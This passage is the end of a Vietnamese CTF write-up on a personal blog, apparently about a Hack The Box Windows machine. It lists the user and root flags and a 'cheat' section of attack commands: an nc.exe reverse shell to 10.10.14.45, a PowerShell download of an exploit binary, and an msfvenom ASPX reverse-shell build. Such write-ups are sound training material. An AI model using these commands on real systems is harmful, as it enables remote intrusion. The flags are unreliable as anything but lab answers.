+</code></pre><p><img src="https://hackmd.io/_uploads/BJQ716nXyg.png" alt="image"></p>
+<p>user flag: <code>e08b790187c71abcdb5fd992fa586f8c</code></p>
+<p>root flag: <code>3a6cb930c7277a37575f39f025009672</code></p>
+<h2 id="cheat">cheat</h2>
+<p><code>anonymous/ put file.txt</code> -&gt; ftp</p>
+<p><code>sudo /home/l3mnt2010/new/htb/smbserver.py share /smb</code> -&gt; để share smb các file exe mà trên máy chủ không có sẵn</p>
+<p><code>\\10.10.14.45\share\nc.exe -e cmd.exe 10.10.14.45 9997</code></p>
+<p><code>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45:9005/40564.exe', 'c:\Users\Public\Downloads\40564.exe')&quot; powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45:9005/40564.exe', 'c:\Users\Public\Downloads\40564.exe')&quot;</code> nếu không có ncat trên máy có thể dùng powershell để tải xuống</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.45 LPORT=4444 -o reverse-shell.aspx</code> gen reverse-shell với msfvenom</p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/windows/">Windows</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-06-23-googlectf2024/" data-toggle="tooltip" data-placement="top" title="Google CTF 2024 - solved &#39;s challenges on time">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-03-09-cyberapocalypse2024/" data-toggle="tooltip" data-placement="top" title="Cyber Apocalypse 2024 - Solved &#39;s challenges in time">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
